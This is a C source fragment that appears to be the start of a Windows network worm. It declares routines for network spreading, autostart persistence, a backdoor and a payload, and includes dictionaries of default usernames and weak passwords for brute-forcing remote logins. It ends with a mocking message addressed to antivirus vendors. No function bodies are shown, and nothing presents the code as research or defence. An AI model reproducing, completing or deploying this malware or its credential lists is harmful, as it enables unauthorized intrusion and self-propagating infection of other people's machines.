#include <windows.h>
#include <winsock.h>

/* functions */
void NetSpread(char *remote,char *my_path);
void AutoStart(char *my_path);
DWORD WINAPI BackDoor(LPVOID Data);
void Payload(void);

/* threads */
DWORD WINAPI L0cal(LPVOID Data);
DWORD WINAPI extra(LPVOID Data);

/* Passwords and users list */

#define USERS_NUM 11
#define PWD_NUM 70

static char *users_list[] = {
	NULL,
	"admin",
	"admins",
	"administrator",
	"amministratore",
	"guest",
	"root",
	"owner",
	"computer",
	"wwwadmin",
	"default"
};
static char *passwords_list[] = {
	 NULL,
	 "qwerty",
	 "007",
	 "123",
	 "1234",
	 "12345",
	 "123456",
	 "1234567",
	 "12345678",
	 "123456789",
	 "1234567890",
	 "access",
	 "command",
	 "bob",
	 "billy",
	 "ibm",
	 "internet",
	 "winxp",
	 "bitch",
	 "data",
	 "database",
	 "home",
	 "server",
	 "login",
	 "loginpass",
	 "linux",
	 "pass",
	 "pass1234",
	 "win2000",
	 "win2k",
	 "win98",
	 "win95",
	 "winnt",
	 "winpass",
	 "root",
	 "web",
	 "user",
	 "test",
	 "pwd",
	 "qw",
	 "qwe",
	 "sex",
	 "sexy",
	 "oracle",
	 "mysql",
	 "nokia",
	 "siemens",
	 "sam",
	 "hell",
	 "intranet",
	 "internet",
	 "boss",
	 "hacker",
	 "system",
	 "2006",
	 "2005",
	 "2004",
	 "2000",
	 "aaa",
	 "abcd",
	 "123abc",
	 "apollo13",
	 "apple",
	 "777",
	 "111",
	 "911",
	 "abcde",
	 "testing",
	 "start",
	 "www"
};

/* internal msg to avers */
static char *msg_to_avers = "We make your business!";